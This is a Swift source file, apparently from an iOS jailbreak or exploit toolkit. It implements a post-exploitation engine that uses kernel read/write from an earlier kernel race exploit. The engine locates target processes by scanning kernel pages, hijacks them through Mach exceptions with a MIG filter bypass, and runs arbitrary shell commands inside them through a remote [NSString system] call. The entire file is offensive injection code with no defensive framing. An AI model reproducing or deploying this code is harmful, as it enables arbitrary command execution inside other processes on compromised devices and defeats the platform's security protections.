import Foundation

public final class RemoteCallEngine: @unchecked Sendable {
    public enum RemoteCallError: LocalizedError {
        case targetNotFound(String)
        case initFailed(String)
        case notSupported(String)
        case executionFailed(String)

        public var errorDescription: String? {
            switch self {
            case .targetNotFound(let n): return "Could not find process: \(n)"
            case .initFailed(let n): return "Failed to connect to \(n)"
            case .notSupported(let d): return "Not supported: \(d)"
            case .executionFailed(let d): return "Remote execution failed: \(d)"
            }
        }
    }

    public init(kernelHandle: KernelRwHandle) {
        // kernelHandle stored for future use by vendored C primitives
    }

    public func findProcess(named name: String) -> pid_t? {
        // BSD proc_name() uses the kernel's PID hash table (proc_find)
        // internally — no proc list walking, no sysctl. Safe on iOS 18+
        // where sysctl KERN_PROC is restricted, and safe after the
        // DarkSword race corrupts the kernel proc list.
        let pid = find_process_via_proc_name(name)
        return pid >= 0 ? pid : nil
    }

    /// Look up a process name from a PID.
    private func findProcessName(for pid: pid_t) -> String? {
        guard let name = get_process_name_for_pid(pid) else { return nil }
        return String(cString: name)
    }

    /// Open a Mach-exception hijack connection to a target process.
    ///
    /// Resolution order:
    ///   1. Cached proc address (from post-exploit page-scan or from safe list walk
    ///      in find_process_via_proc_name) — zero krw for process lookup, immune to
    ///      DarkSword proc-list corruption.
    ///   2. proc_find_by_page_scan — linear kernel page scan at 0x40 stride, never
    ///      follows le_next/le_prev. Validates BOTH p_pid AND p_name per candidate.
    ///      Immune to DarkSword linked-list corruption and false PID matches.
    ///   3. find_process_via_proc_name which caches the proc address when found via
    ///      name-based safe list walk (avoids false-positive PID matches).
    ///   4. PID-based RemoteCall as last resort (uses safe_procbypid which can return
    ///      false-positive matches from DarkSword p_pid corruption).
    public func connectToProcess(named name: String) throws -> RemoteCall {
        // Step 1: Cached proc address (set by Step 6 in handleExploitSuccess).
        if let rc = cachedRemoteCall(for: name) { return rc }

        // Step 2: Page-scan fallback — scans kernel pages at 0x40 stride, never
        // follows le_next/le_prev. Validates both p_pid AND p_name per candidate.
        // Immune to DarkSword proc-list corruption (0x40-byte write cannot span
        // both p_pid and p_name offsets on the same struct).
        // Runs BEFORE find_process_via_proc_name to prevent list-walk-based
        // cache overwrites from corrupting the cached address.
        let pageScanAddr = proc_find_by_page_scan(name)
        if pageScanAddr > 0 {
            save_cached_proc_addr(name, pageScanAddr)
            if let rc = cachedRemoteCall(for: name) { return rc }
        }

        // Step 3: find process by name. The C function caches the verified
        // proc address via save_cached_proc_addr when it finds by name.
        guard let pid = findProcess(named: name) else {
            throw RemoteCallError.targetNotFound(name)
        }

        // Re-check cache — find_process_via_proc_name may have populated it
        // via safe_find_proc_by_name (by name, immune to false PID matches).
        if let rc = cachedRemoteCall(for: name) { return rc }

        // Step 4: PID-based init with safe_procbypid.
        // Has false-positive risk from DarkSword p_pid corruption.
        guard let rc = RemoteCall(pid: pid, useMigFilterBypass: true) else {
            throw RemoteCallError.initFailed(name)
        }
        return rc
    }

    private func cachedRemoteCall(for name: String) -> RemoteCall? {
        let procAddr = get_cached_proc_addr(name)
        guard procAddr > 0 else { return nil }
        guard let rc = RemoteCall(procAddr: procAddr, useMigFilterBypass: true) else {
            return nil
        }
        return rc
    }

    /// Execute a shell command inside a target process via Mach exception hijacking.
    /// Validates the PID exists, resolves the process name, connects via RemoteCall,
    /// and invokes [NSString system] on the injected NSString.
    public func execute(inProcess pid: pid_t, command: String) async throws -> String {
        let result = kill(pid, 0)
        if result != 0 {
            let err = errno
            guard err == EPERM || err == EACCES || err == EINVAL else {
                throw RemoteCallError.targetNotFound("PID \(pid)")
            }
        }
        guard let name = findProcessName(for: pid) else {
            throw RemoteCallError.targetNotFound("PID \(pid)")
        }
        let rc = try connectToProcess(named: name)
        let exitCode = try callSystem(rc: rc, command: command)
        return String(exitCode)
    }

    public func callSystem(rc: RemoteCall, command: String) throws -> Int {
        let cmdStr = remote_NSString(rc, command)
        guard cmdStr > 0 else { throw RemoteCallError.executionFailed("remote_NSString") }
        let sel = remote_sel(rc, "system")
        guard sel > 0 else { throw RemoteCallError.executionFailed("remote_sel system") }
        let cls = remote_getClass(rc, "NSString")
        guard cls > 0 else { throw RemoteCallError.executionFailed("remote_getClass NSString") }
        let result = remote_msg(rc, cmdStr, sel, 0, 0, 0, 0)
        // [NSString system] returns int (32-bit), but remote_msg returns
        // the full uint64_t x0. Upper 32 bits are undefined for int returns
        // per AAPCS64 — truncate to Int32 then sign-extend to Int.
        return Int(Int32(truncatingIfNeeded: result))
    }
}

